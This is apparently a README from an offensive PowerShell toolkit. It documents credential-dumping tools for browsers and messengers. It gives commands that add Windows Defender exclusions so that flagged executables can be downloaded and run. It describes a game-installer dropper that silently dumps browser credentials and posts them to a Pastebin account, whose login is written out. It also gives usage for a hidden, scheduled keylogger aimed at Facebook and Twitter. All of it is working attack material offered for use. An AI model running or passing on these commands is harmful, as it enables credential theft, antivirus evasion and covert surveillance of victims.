## DumpChromePasswords.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|DumpChromePasswords|dumps URLs, usernames, and passwords from Chrome.|User Land|Only dumps chrome browser|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/DumpChromePasswords.ps1" -OutFile "DumpChromePasswords.ps1"
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip" -OutFile "sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip"
```
<br />

**prerequisites:**
``` 
   1. You must have the System.Data.SQLite.dll handy (see below)
   2. Your database must be accessible (close Chrome, or make some copy)
   3. It must by your database. If Chrome cannot open it, the script will probably fail as well.
```

<br />

**execute:**
```powershell
.\DumpChromePasswords.ps1
```

<br />


## HarvestBrowserPasswords.exe

|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|Dumps major browsers|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
```

<br />

**execute:**
```powershell
.\HarvestBrowserPasswords.exe -a, --all
.\HarvestBrowserPasswords.exe -f, --firefox
.\HarvestBrowserPasswords.exe -c, --chrome
```

<br />

## ChromePass.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|ChromePass|dumps usernames, passwords from chrome|Administrator|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV\Download PE\Exec PE|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
```

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name "WinDefend")

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Get-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
```

<br />

**execute:**
```powershell
#Get Exclusions List
.\Invoke-Exclusions.ps1 -action "query"

## Add exclusion Path + Download URI PE + Execute PE
# 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -OutFile "$Env:TMP\ChromePass.exe"
# 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"

#Remove ExclusionPath "$Env:TMP" from Windows Defender list
.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
```

<br />

**Final Notes**
```
ChromePass.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute ChromePass.exe from that location.

Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (ChromePass.exe).
Warning: Invoke-Exclusions will 'NOT' delete itself or ChromePass.exe (deliver by -Uri parameter) at the end of execution.
```

<br />

## WebBrowserPassView.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|WebBrowserPassView|dumps usernames, passwords from major browsers|UserLand|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV detection<br />[WebBrowserPassView - nirsoft](https://www.nirsoft.net/utils/web_browser_password.html)|

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name "WinDefend")

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Get-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
```

<br />

**execute:**
```powershell
#Download Invoke-Exclusions cmdlet
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"

#Get Exclusions List (optional)
.\Invoke-Exclusions.ps1 -action "query"

## Add exclusion Path + Download URI PE + Execute PE
# 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/WebBrowserPassView.exe" -OutFile "$Env:TMP\WebBrowserPassView.exe"
# 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/WebBrowserPassView.exe" -Arguments "/stext credentials.log"

#Read logfile
Get-Content -Path "$Env:TMP\credentials.log"

#Remove ExclusionPath "$Env:TMP" from Windows Defender list
.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
```

<br />

**Final Notes**
```
WebBrowserPassView.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute WebBrowserPassView.exe from that location.

Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (WebBrowserPassView.exe).
Warning: Invoke-Exclusions will 'NOT' delete itself or WebBrowserPassView.exe (deliver by -Uri parameter) at the end of execution.
```

<br />

## mspass.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|mspass|dumps usernames, passwords of messenger applications|UserLand|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV detection<br />[mspass - nirsoft](https://www.nirsoft.net/utils/mspass.html)|

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name "WinDefend")

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Get-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
```

<br />

**execute:**
```powershell

#Download Invoke-Exclusions cmdlet
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"

#Get Exclusions List (optional)
.\Invoke-Exclusions.ps1 -action "query"

## Add exclusion Path to Download URI PE + Execute PE
# 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -OutFile "$Env:TMP\mspass.exe"
# 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -Arguments "/stext credentials.log"

#Read logfile
Get-Content -Path "$Env:TMP\credentials.log"

#Remove ExclusionPath "$Env:TMP" from Windows Defender list
.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
```

<br />

**Final Notes**
```
mspass.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute mspass.exe from that location.

Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (mspass.exe).
Warning: Invoke-Exclusions will 'NOT' delete itself or mspass.exe (deliver by -Uri parameter) at the end of execution.
```

<br />


## Hopmon.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|[Hopmon.PS1](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Dump-Browser/Hopmon.ps1)|Install Hopmon game (social engineering) + dumps browsers credentials<br />Browsers supported:  Chromium, Chrome, Firefox, MEdge, Safari, Opera|Administrator|send credentials to pastebin|

<br />

**Description:**<br />
This project uses [winget](https://learn.microsoft.com/en-us/windows/package-manager/winget/) to install Hopmon game from microsoft store (social engineering),<br />
then dumps all browsers credentials stored (silent execution) from memory and send them<br />
to the website: https://pastebin.com/u/pedro_testing where we can review the credentials.<br />

This project contains <b><i>Hopmon.exe Hopmon.ps1</i></b> and <b><i>Hopmon.vbs</i></b> but we<br />
only need to send <b><i>Hopmon.exe</i></b> to target user and convince him to execute it.<br /><br />

- Hopmon.exe execution flow
  * It asks for administrator privileges to run (UAC)
  * It modifies powershell execution policy to UnRestricted
  * It downloads [Hopmon.PS1](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Dump-Browser/Hopmon.ps1) script into %TEMP% directory
  * Executes [Hopmon.PS1](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Dump-Browser/Hopmon.ps1) in background (hidden) process (orphan)

- Hopmon.ps1 execution flow
  * Installs [Hopmon game](http://saitogames.com/hopmon/index.htm) from microsoft store.
  * Creates %TMP% directory exclusion in windows Defender
  * Dumps credentials from all installed browsers (%TEMP%)
  * Sends credentials dump to our account in PasteBin.com
  * It deletes itself (Hopmon.PS1) in the end of execution

<br />

**prerequesites checks:**
```powershell
## Make sure WinGet its installed (optional test)
# By default Winget its installed
Winget -v

## Make sure Windows Defender service its running (mandatory test)
# This project only bpasses Windows Defender detection
# but it will alow users to execute it againts other av's
[bool](Get-Service -Name "WinDefend")

## Make sure required modules are present\loaded (optional test)
# This project only bpasses Windows Defender detection
# but it will alow users to execute it againts other av's
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
```

<br />

**Download Project:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/Hopmon.rar" -OutFile "Hopmon.rar"
```

<br />

**Execute Dropper (payload)**
```powershell
.\Hopmon.exe ( or double click to execute )
```

<br /><br />

**Access pastebin to review credentials dump:**
```
1 - The attacker needs to access URL : https://pastebin.com/u/pedro_testing
2 - The attacker needs to login with username : pedro_testing
3 - The attacker needs to login with password : angelapastebin

- The attacker can now review all credentials captured ( logfiles )
```

<br /><br />

**How to install a diferent game\program ?**
```
1 - Edit Hopmon.vbs script
2 - Search inside the file for '-file Hopmon.ps1'
3 - Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -Program Sunshine'
4 - Send Hopmon.vbs (or compile to EXE) to target for manual execution.
```

**How to list WinGet (microsoft store) games available ?**
```powershell
Winget search games
```


<br /><br />

**How to use a diferent pastebin account ?**
```
1 - Edit Hopmon.vbs script
2 - Search inside the file for '-file Hopmon.ps1'
3 - Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -PasteBinUserName r00t -PasteBinPassword angela -PastebinDeveloperKey 1ab4e39c94db4'
4 - Send Hopmon.vbs (or compile to EXE) to target for manual execution.
```

<br />

## SocialMedia.ps1
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|[SocialMedia](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Dump-Browser/SocialMedia.ps1)|Capture keyboard keystrokes from Facebook OR Twitter (browser)|UserLand|browser (active tab) keystrokes capture|

<br />

|Parameter|Description|value|Default value|
|---|---|---|---|
|Mode|Start or Stop keylogger|Start, Stop|Start|
|Delay|Milliseconds delay between loops|1200|1200|
|Force|Switch to bypass check: Is_Browser_Active?|Switch|Switch|
|Schedule|Schedule cmdlet execution to: [HH:mm]|now|now|

<br />

**Download cmdlet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/SocialMedia.ps1" -OutFile "SocialMedia.ps1"
```

**execute:**
```powershell
## Start browser keylogger capture
.\SocialMedia.ps1 -mode 'start'

## Use 5 seconds delay between each loop
.\SocialMedia.ps1 -delay '5000'

## Bypass Is_Browser_Active? checks
.\SocialMedia.ps1 -force

## Stop keylogger and leak keystrokes on screen
.\SocialMedia.ps1 -mode 'stop'

## Schedule cmdlet capture to start at [HH:mm] hours
.\SocialMedia.ps1 -schedule '02:34' -Mode 'start'

## Schedule cmdlet capture to start at -shedule '[HH:mm]' hours and Bypass check: Is_Browser_Active?
Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -schedule '02:34' -mode 'start' -force"

## Invoke SocialMedia cmdlet in a hidden windows console detach from parent process with the best chances (delay) of capture credentials
Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -delay '800' -force" 
```
